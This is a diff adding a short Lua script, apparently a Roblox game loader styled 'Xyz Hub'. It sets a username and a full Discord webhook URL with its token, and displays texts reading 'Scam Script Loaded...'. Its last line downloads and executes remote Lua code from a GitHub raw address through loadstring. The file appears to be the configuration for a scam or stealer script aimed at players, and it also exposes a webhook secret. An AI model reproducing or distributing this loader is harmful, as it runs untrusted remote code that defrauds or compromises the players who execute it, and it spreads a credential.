@@ -1,0 +1,10 @@
+Username = "HqLaTrLol"
+WebHook = "https://discord.com/api/webhooks/1080047152388116511/KHoxRMqj2mAx8KPn-IG6OZ5hI4UB8iahL_6mvuty0xAfOt5X5XkF_j3ACCxm0Ycd-kQH"
+
+
+_G.CustomScriptName = "Xyz Hub"
+_G.Text1 = "Scam Script Loaded..."
+_G.Text2 = "Waiting for Scam Script"
+_G.Text3 = "Checking Scam Scripts..."
+_G.Text4 = "Starting Scam Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
